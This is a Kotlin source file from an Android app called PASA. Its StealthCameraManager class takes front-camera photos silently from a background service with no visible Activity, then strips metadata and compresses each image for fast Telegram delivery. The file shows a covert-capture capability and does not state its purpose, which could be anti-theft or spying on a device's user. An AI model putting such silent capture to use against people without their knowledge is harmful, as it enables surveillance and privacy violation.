package com.izhaanintellect.pasa.camera

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.Handler
import android.os.Looper
import android.util.Log
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleRegistry
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.suspendCancellableCoroutine
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*
import javax.inject.Inject
import javax.inject.Singleton
import kotlin.coroutines.resume

/**
 * Manages silent camera capture from service context.
 * Uses CameraX with a dedicated ServiceLifecycleOwner to operate without an Activity.
 */
@Singleton
class StealthCameraManager @Inject constructor(
    @ApplicationContext private val context: Context
) {
    companion object {
        private const val TAG = "PASA_Camera"
    }

    suspend fun capturePhoto(useFrontCamera: Boolean = true): File? {
        if (!hasCameraPermission()) {
            Log.w(TAG, "Camera permission not granted")
            return null
        }

        return try {
            suspendCancellableCoroutine { continuation ->
                val cameraProviderFuture = ProcessCameraProvider.getInstance(context)

                cameraProviderFuture.addListener({
                    var lifecycleOwner: ServiceLifecycleOwner? = null
                    var cameraProvider: ProcessCameraProvider? = null

                    try {
                        cameraProvider = cameraProviderFuture.get()
                        lifecycleOwner = ServiceLifecycleOwner()

                        val cameraSelector = if (useFrontCamera) {
                            CameraSelector.DEFAULT_FRONT_CAMERA
                        } else {
                            CameraSelector.DEFAULT_BACK_CAMERA
                        }

                        // Check if the selected camera is available on device
                        if (!cameraProvider.hasCamera(cameraSelector)) {
                            Log.e(TAG, "Device lacks requested camera (front=$useFrontCamera)")
                            continuation.resume(null)
                            return@addListener
                        }

                        val imageCapture = ImageCapture.Builder()
                            .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                            .build()

                        cameraProvider.unbindAll()
                        lifecycleOwner.start()
                        cameraProvider.bindToLifecycle(
                            lifecycleOwner,
                            cameraSelector,
                            imageCapture
                        )

                        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
                        val photoFile = File(context.cacheDir, "pasa_capture_${timestamp}.jpg")
                        val outputOptions = ImageCapture.OutputFileOptions.Builder(photoFile).build()

                        val mainHandler = Handler(Looper.getMainLooper())
                        val timeoutRunnable = Runnable {
                            if (continuation.isActive) {
                                Log.w(TAG, "Camera capture timed out waiting for CameraX callback (10s)")
                                cleanup(lifecycleOwner, cameraProvider)
                                continuation.resume(null)
                            }
                        }
                        mainHandler.postDelayed(timeoutRunnable, 10000)

                        continuation.invokeOnCancellation {
                            mainHandler.removeCallbacks(timeoutRunnable)
                            cleanup(lifecycleOwner, cameraProvider)
                        }

                        // Short delay to allow exposure/focus stabilization
                        mainHandler.postDelayed({
                            try {
                                imageCapture.takePicture(
                                    outputOptions,
                                    ContextCompat.getMainExecutor(context),
                                    object : ImageCapture.OnImageSavedCallback {
                                        override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                                            mainHandler.removeCallbacks(timeoutRunnable)
                                            try {
                                                optimizeAndStripPhoto(photoFile)
                                            } catch (e: Exception) {
                                                Log.w(TAG, "Photo optimization warning: ${e.message}")
                                            }
                                            Log.i(TAG, "Photo captured successfully: ${photoFile.absolutePath} (${photoFile.length() / 1024} KB)")
                                            cleanup(lifecycleOwner, cameraProvider)
                                            if (continuation.isActive) continuation.resume(photoFile)
                                        }

                                        override fun onError(exception: ImageCaptureException) {
                                            mainHandler.removeCallbacks(timeoutRunnable)
                                            Log.e(TAG, "Photo capture failed", exception)
                                            cleanup(lifecycleOwner, cameraProvider)
                                            if (continuation.isActive) continuation.resume(null)
                                        }
                                    }
                                )
                            } catch (e: Exception) {
                                mainHandler.removeCallbacks(timeoutRunnable)
                                Log.e(TAG, "Exception during takePicture", e)
                                cleanup(lifecycleOwner, cameraProvider)
                                if (continuation.isActive) continuation.resume(null)
                            }
                        }, 500)

                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to initialize CameraX", e)
                        cleanup(lifecycleOwner, cameraProvider)
                        if (continuation.isActive) continuation.resume(null)

                    }
                }, ContextCompat.getMainExecutor(context))
            }
        } catch (e: Exception) {
            Log.e(TAG, "Camera capture error", e)
            null
        }
    }

    private fun optimizeAndStripPhoto(file: File) {
        if (!file.exists() || file.length() == 0L) return
        try {
            com.izhaanintellect.pasa.util.PrivacyHygieneHelper.stripExifMetadata(file)

            // If file is larger than 600KB, downscale/compress for rapid Telegram delivery (<1s upload)
            if (file.length() > 600 * 1024) {
                val boundsOptions = BitmapFactory.Options().apply {
                    inJustDecodeBounds = true
                }
                BitmapFactory.decodeFile(file.absolutePath, boundsOptions)
                val origW = boundsOptions.outWidth
                val origH = boundsOptions.outHeight

                var sampleSize = 1
                while ((origW / sampleSize) > 1920 || (origH / sampleSize) > 1920) {
                    sampleSize *= 2
                }

                val decodeOptions = BitmapFactory.Options().apply {
                    inSampleSize = sampleSize
                    inPreferredConfig = Bitmap.Config.RGB_565
                }
                val bitmap = BitmapFactory.decodeFile(file.absolutePath, decodeOptions)
                if (bitmap != null) {
                    val fos = FileOutputStream(file)
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 85, fos)
                    fos.flush()
                    fos.close()
                    bitmap.recycle()
                    Log.i(TAG, "Photo optimized: ${origW}x${origH} -> sample $sampleSize, size: ${file.length() / 1024} KB")
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Could not compress photo: ${e.message}")
        }
    }

    private fun cleanup(lifecycleOwner: ServiceLifecycleOwner?, provider: ProcessCameraProvider?) {
        try {
            lifecycleOwner?.stop()
            provider?.unbindAll()
        } catch (e: Exception) {
            Log.e(TAG, "Error cleaning up camera resources", e)
        }
    }

    fun hasCameraPermission(): Boolean {
        return ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.CAMERA
        ) == PackageManager.PERMISSION_GRANTED
    }

    private class ServiceLifecycleOwner : LifecycleOwner {
        private val lifecycleRegistry = LifecycleRegistry(this)

        init {
            lifecycleRegistry.currentState = Lifecycle.State.INITIALIZED
        }

        fun start() {
            lifecycleRegistry.currentState = Lifecycle.State.STARTED
            lifecycleRegistry.currentState = Lifecycle.State.RESUMED
        }

        fun stop() {
            lifecycleRegistry.currentState = Lifecycle.State.DESTROYED
        }

        override val lifecycle: Lifecycle
            get() = lifecycleRegistry
    }
}
